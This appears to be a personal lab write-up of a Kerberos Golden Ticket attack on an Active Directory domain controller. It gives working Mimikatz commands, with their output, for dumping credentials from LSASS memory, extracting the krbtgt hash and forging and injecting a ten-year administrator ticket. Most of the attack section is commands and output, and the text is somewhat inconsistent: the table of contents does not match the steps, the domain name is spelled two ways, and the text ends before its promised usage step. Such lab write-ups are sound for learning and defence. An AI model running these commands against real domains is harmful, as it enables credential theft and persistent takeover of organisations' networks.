# golden ticket generation

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:**Credential Capture  
**Difficulty:** Easy  
**Tools:** NetExec, Evil-winrm

## Table of Contents

- [What is a Golden Ticket?](#what-is-a-golden-ticket)
- [Why This Attack is Dangerous](#why-this-attack-is-dangerous)
- [What I Needed Before Starting](#what-i-needed-before-starting)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Step 1 — Getting a Shell on the Domain Controller](#step-1--getting-a-shell-on-the-domain-controller)
- [Step 2 — Uploading Mimikatz to the DC](#step-2--uploading-mimikatz-to-the-dc)
- [Step 3 — Dumping the krbtgt Hash](#step-3--dumping-the-krbtgt-hash)
- [Step 4 — Generating the Golden Ticket](#step-4--generating-the-golden-ticket)
- [Step 5 — Using the Golden Ticket](#step-5--using-the-golden-ticket)
- [What I Achieved](#what-i-achieved)

# What is Golden Ticket ?

A Golden Ticket is a forged Kerberos ticket that gives an attacker unlimited access to every resource in the domain — forever, or until the krbtgt account password is changed twice.
The whole attack is based on one thing — the krbtgt account. This is a special account in Active Directory that signs every single Kerberos ticket in the domain. If I get its password hash, I can forge my own tickets and pretend to be any user, including Domain Admin — without ever touching the real account.

# Why This Attack is Dangerous

- The forged ticket works even if the real user's password is changed
- It bypasses normal authentication completely
- It can last for 10 years by default
- It is very hard to detect since it looks like a normal Kerberos ticket
- Even resetting the Administrator password does not stop it — only changing krbtgt password twice does

## What I Needed Before Starting

To perform this attack, I needed the following prerequisites:

```
| Requirement         |                                      Why It Was Needed                               |
|---------------------|--------------------------------------------------------------------------------------|
| Domain Admin Access | Required to run Mimikatz on the Domain Controller and extract sensitive information. |
| `krbtgt` NTLM Hash  | Used to forge a valid Kerberos Ticket Granting Ticket (Golden Ticket).               |
| Domain SID          | Required when constructing the forged Kerberos ticket.                               |
| Domain Name         | Required when generating the Golden Ticket.                                          |
```

# What I Understood During the Process

While working through this attack I realized that:

The krbtgt account is the most sensitive account in any Active Directory domain
Whoever controls its hash essentially controls the entire domain
Golden Tickets do not need network access to generate — everything is done locally
Detection is difficult because the ticket looks completely legitimate to the DC


# Step 1 - Download mimikatz_trunk.zip in kali

First I downloaded mimikatz_trunk.zip from github in kali and then transfer it to dc.
then I unzip mimikatz_trunk.zip file on dc. 


# Step 2 - run mimikatz.exe

After that I open cmd and run mimikatz.exe file.

```bash
C:\Users\Administrator\Downloads>mimikatz.exe
```

**Output:**

```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

  mimikatz #
  ```

### Enable Debug Privilege

```bash
mimikatz # privilege::debug
```
**Output:**

```text
Privilege '20' OK
```

`Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.

# Step 3 - Dumping Credentials from Memory

```bash
sekurlsa::logonpasswords
```

This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.

LSASS (Local Security Authority Subsystem Service) is a Windows process that handles all logins. Every time someone logs into the machine, Windows keeps their credentials in LSASS memory to keep the session running. Mimikatz reaches into that memory and pulls everything out.

**Output:**

```
Authentication Id : 0 ; 910653 (00000000:000de53d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : READTEAMBD
Logon Server      : REDTEAMBD-DC
Logon Time        : 6/6/2026 11:07:52 AM
SID               : S-1-5-21-2745015721-426968701-4006811760-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : READTEAMBD
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         * DPAPI    : 254d7e38c7b4a507b03f747b5177a2af
```

### Credentials Recovered

| User            | Domain       | NTLM Hash                          |
|-----------------|--------------|------------------------------------|
| `Administrator` | `READTEAMBD` | `fc525c9683e8fe067095ba2ddc971889` |
| `REDTEAMBD-DC$` | `READTEAMBD` | `5d61398d1bb36494251624d87522d005` |

Got the Administrator NTLM hash sitting right in memory. No cracking needed — I can use this directly for Pass the Hash.

<p align="center">
  <img src="/writeups/golden ticket/images/Screenshot_4.png" width="600">
</p>

## Step - 4 Dumping krbtgt Hash

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
```

### Flag Breakdown
```
| Flag           | Description                                               |
|----------------|-----------------------------------------------------------|
| `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
| `/inject`      | Injects into the LSASS process to extract data            |
| `/name:krbtgt` | Targets specifically the `krbtgt` account                 |
```

Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.

## Step - 5 Generating and Injecting the Golden Ticket

```bash
kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
```

### Flag Breakdown

| Flag | Value | Description |
|------|-------|-------------|
| `/user` | `Administrator` | The user I am impersonating |
| `/domain` | `readteambd.local` | The domain name |
| `/sid` | `S-1-5-21-2745015721-426968701-4006811760` | The domain SID |
| `/krbtgt` | `5f8156b8f557baae7cd069ac724e1959` | The krbtgt NTLM hash used to sign the ticket |
| `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
| `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |

### `/ptt` vs `/ticket`

| Flag | What it does |
|------|-------------|
| `/ptt` | Injects ticket directly into current session memory |
| `/ticket` | Saves the ticket to a `.kirbi` file for later use |

I used `/ptt` here so the ticket gets loaded into my session immediately — no need to load it manually afterwards.

**Output:**

```
User      : Administrator
Domain    : readteambd.local (READTEAMBD)
SID       : S-1-5-21-2745015721-426968701-4006811760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5f8156b8f557baae7cd069ac724e1959 - rc4_hmac_nt
Lifetime  : 6/6/2026 9:15:09 PM ; 6/3/2036 9:15:09 PM ; 6/3/2036 9:15:09 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ readteambd.local' successfully submitted for current session
```